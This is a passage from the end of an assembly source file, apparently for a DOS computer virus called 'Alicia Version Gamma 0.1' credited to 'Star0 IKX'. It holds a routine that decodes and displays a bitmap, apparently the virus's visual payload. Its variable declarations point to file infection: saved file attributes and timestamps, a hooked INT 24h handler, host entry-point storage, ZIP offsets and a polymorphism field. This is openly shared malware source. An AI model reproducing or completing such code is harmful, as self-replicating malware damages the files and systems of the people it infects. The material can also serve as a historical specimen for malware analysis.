   retrace1:
   in al, dx
   test al, 8
   jz retrace1                  ; wait for screen sync
   retrace2:
   in al, dx
   test al, 8
   jnz retrace2
   pop ax

   ret

   setcolor:                               ; set color palette

   push ax
   push bx

   mov dx,3c8h
   out dx,al

   mov dx,3c9h
   mov al,ah
   out dx,al

   mov al,bl
   out dx,al

   mov al,bh
   out dx,al

   pop bx
   pop ax

   ret

   printchar:                              ; print char with size * 20

   mov bx,9
   mov dx,9
   mov di,(7*320)+8
   minibx:

   mov ah,byte ptr es:[di]
   push di
   call write_big_point
   pop di
   dec di
   dec bx
   jnz minibx

   sub di,320-9
   mov bx,9
   dec dx

   jnz minibx

   ret

   write_big_point:

   push dx
   push bx

   dec dx
   dec cx

   push ax

   push dx

   push bx
   pop ax

   mov cx,320/32

   mul cx

   mov si,ax

   pop ax

   mov cx,320

   mul cx

   mov cx,(200/20)

   mul cx

   add si,ax

   pop ax

   mov bx,200/20
   mov cx,320/32

   add si,(160-40)+(320*60)

   cmp ah,255
   jne minicx
   mov ah,7

   minicx:

   mov byte ptr es:[si],ah
   inc si

   loop minicx

   add si,320-((320/32))
   mov cx,(320/32)
   dec bx
   jnz minicx

   pop bx
   pop dx

   ret

   playingload:                                    ; put a small immage
   uncruncher:

   lea si,[bp+yeye]
   lea di,[bp+starttable]
   mov cx,4800                                     ; decompact the image

   push di
   repz mov byte ptr cs:[di],0
   pop di

   mov cx,600+(14*8)

   maxiloopa:

   push cx

   mov dl,byte ptr cs:[si]
   mov cx,8

   minusloopa:

   mov byte ptr cs:[di],0
   mov dh,dl
   and dh,00000001b
   cmp dh,00000001b                                ; analyse binary
   jne skipput1                                    ; if dh = 1
   mov byte ptr cs:[di],1                          ; the put 1 in the buffer
   skipput1:
   inc di
   ror dl,1

   loop minusloopa

   pop cx
   inc si
   loop maxiloopa

   mov ax,13h
   int 10h                                 ; set video

   lea si,[bp+starttable]
   mov di,0

   push 0A000h
   pop es

   mov cx,80

   maxiloop0:

   push cx

   mov cx,30

   minusloop0:

   mov ax,word ptr cs:[si]                         ; put image in si
   mov word ptr es:[di],ax

   inc si
   inc si
   inc di
   inc di

   loop minusloop0

   add di,320-60

   pop cx

   loop maxiloop0

   xor ax,ax
   int 16h                                         ; wait for a key

   mov ax,3
   int 10h                                         ; reset video

   ret

   yeye:

    db 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 0e0h, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 07fh, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 024h, 000h
    db 000h, 000h, 000h, 000h, 000h, 040h, 072h, 0fch, 038h, 01eh, 03ch, 0e7h
    db 0e1h, 0a4h, 009h, 0c3h, 064h, 002h, 033h, 026h, 053h, 01ah, 030h, 04ch
    db 026h, 018h, 063h, 032h, 0a5h, 001h, 0c3h, 064h, 0c2h, 030h, 026h, 053h
    db 072h, 030h, 04ch, 026h, 006h, 063h, 032h, 025h, 008h, 0c3h, 064h, 032h
    db 030h, 026h, 053h, 082h, 030h, 07ch, 01eh, 003h, 0e7h, 031h, 0a5h, 009h
    db 0c3h, 064h, 032h, 032h, 026h, 053h, 072h, 030h, 04ch, 026h, 03fh, 067h
    db 0e2h, 024h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 002h, 000h, 000h
    db 000h, 000h, 000h, 000h, 0e4h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 07fh
    db 0feh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0e7h, 0ffh, 0ffh, 03fh, 080h
    db 0ffh, 0ffh, 07fh, 0feh, 0ffh, 03fh, 000h, 080h, 0ffh, 0ffh, 0e7h, 0ffh
    db 0ffh, 000h, 000h, 0e0h, 0ffh, 07fh, 0feh, 0ffh, 003h, 000h, 000h, 0f8h
    db 0ffh, 0e7h, 0ffh, 01fh, 000h, 000h, 000h, 0ffh, 07fh, 0feh, 07fh, 000h
    db 000h, 000h, 0c2h, 0ffh, 0e7h, 0ffh, 003h, 000h, 000h, 0c0h, 0f8h, 07fh
    db 0feh, 01fh, 000h, 000h, 000h, 010h, 0ffh, 0e7h, 0ffh, 000h, 000h, 000h
    db 000h, 0e2h, 07fh, 0feh, 00fh, 000h, 000h, 000h, 040h, 0feh, 0e7h, 07fh
    db 000h, 000h, 004h, 000h, 0c8h, 07fh, 0feh, 003h, 000h, 0e0h, 000h, 000h
    db 0f9h, 0e7h, 03fh, 000h, 000h, 004h, 000h, 090h, 07fh, 0feh, 001h, 000h
    db 000h, 000h, 000h, 0f0h, 0e7h, 01fh, 000h, 000h, 000h, 000h, 000h, 07fh
    db 0feh, 000h, 000h, 000h, 000h, 000h, 0e0h, 0e7h, 00fh, 000h, 000h, 000h
    db 000h, 000h, 07eh, 0feh, 000h, 000h, 000h, 000h, 000h, 0e0h, 0e7h, 03fh
    db 000h, 000h, 000h, 000h, 000h, 07eh, 0feh, 03fh, 000h, 000h, 000h, 000h
    db 0c0h, 0e7h, 0ffh, 07fh, 000h, 000h, 000h, 000h, 07ch, 0feh, 0ffh, 07fh
    db 000h, 000h, 000h, 0c0h, 0e7h, 0ffh, 0ffh, 07fh, 000h, 000h, 000h, 07ch
    db 0feh, 0ffh, 0ffh, 03fh, 000h, 000h, 0c0h, 0e7h, 0ffh, 0ffh, 0ffh, 000h
    db 000h, 000h, 07ch, 0feh, 0ffh, 0ffh, 003h, 000h, 000h, 0c0h, 0e7h, 0ffh
    db 0ffh, 00fh, 000h, 000h, 000h, 07ch, 0feh, 0ffh, 03fh, 000h, 000h, 000h
    db 0c0h, 0e7h, 0ffh, 0ffh, 000h, 000h, 000h, 000h, 07eh, 0feh, 0ffh, 003h
    db 000h, 000h, 000h, 0e0h, 0e7h, 0ffh, 00fh, 000h, 000h, 000h, 000h, 07eh
    db 0feh, 03fh, 000h, 000h, 000h, 000h, 0e0h, 0e7h, 0ffh, 000h, 000h, 000h
    db 000h, 000h, 07fh, 0feh, 003h, 000h, 000h, 000h, 000h, 0f0h, 0e7h, 03fh
    db 000h, 000h, 000h, 000h, 080h, 07fh, 0feh, 003h, 000h, 000h, 000h, 000h
    db 0f8h, 0e7h, 07fh, 000h, 000h, 000h, 000h, 0c0h, 07fh, 0feh, 00fh, 000h
    db 000h, 000h, 000h, 0feh, 0e7h, 0ffh, 000h, 000h, 000h, 000h, 0e0h, 07fh
    db 0feh, 01fh, 000h, 000h, 000h, 000h, 0ffh, 0e7h, 0ffh, 003h, 000h, 000h
    db 000h, 0f8h, 07fh, 0feh, 07fh, 000h, 000h, 000h, 0c0h, 0ffh, 0e7h, 0ffh
    db 01fh, 000h, 000h, 000h, 0ffh, 07fh, 0feh, 0ffh, 003h, 000h, 000h, 0f8h
    db 0ffh, 0e7h, 0ffh, 0ffh, 000h, 000h, 0e0h, 0ffh, 07fh, 0feh, 0ffh, 03fh
    db 000h, 080h, 0ffh, 0ffh, 0e7h, 0ffh, 0ffh, 03fh, 080h, 0ffh, 0ffh, 07fh
    db 0feh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0e7h, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 07fh, 0feh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 027h, 000h
    db 000h, 000h, 000h, 000h, 000h, 040h, 07ah, 01ch, 0c7h, 0f1h, 038h, 0cch
    db 0efh, 0a4h, 0c9h, 058h, 026h, 093h, 0c5h, 030h, 056h, 09ah, 08ch, 065h
    db 032h, 059h, 00ch, 063h, 0a5h, 0c9h, 018h, 026h, 093h, 0c5h, 030h, 056h
    db 09ah, 08ch, 061h, 032h, 059h, 00ch, 063h, 0a5h, 0c9h, 018h, 026h, 093h
    db 0c5h, 030h, 056h, 07ah, 09ch, 065h, 0f2h, 058h, 00ch, 063h, 0a5h, 0c9h
    db 058h, 026h, 093h, 0c5h, 030h, 056h, 09ah, 09ch, 0c7h, 031h, 039h, 01ch
    db 0e3h, 024h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 0feh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 007h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h

   crunch:

   fininform:

   trademark:      db ' A l i c i a Û  Version Gamma 0 . 1 Û by Star0 I K X  ',0
   fintrade:

                   db ' In honor of B0z0 ikx '

   fin:

   writeprot:  db  ?
   temporaryattr:  dw  ?
   temporarydate:  dw  ?
   temporaryhour:  dw  ?
   finallowsize:   dw  ?
   finalhisize:    dw  ?
   savedds:    dw  ?
   savedes:    dw  ?
   offhost:    dw  ?
   seghost:    dw  ?
   old24seg:   dw  ?
   old24off:   dw  ?
   namesize:       dw      ?
   zipoffst:       dd      ?
   zipseg:         dw      ?
   totalsize:  dw  ?
   genseg:     dw  ?
   precrc32cx: dw  ?
   precrc32dx: dw  ?
   precrc16:   dw  ?
   polytemporary:  dw  ?
   prepared:       dw      ?
   databuff:       dw      ?
   predifinedkey:  dw      ?
   buffer7:    db  7 dup (?)
   betaname:       db      13 dup (?)
   save:       db  01Ah dup (?)
   temporary1:     db      1024 dup (?)
   starttable:     db      1024 dup (?)
                   db      2 dup (?)
   end start
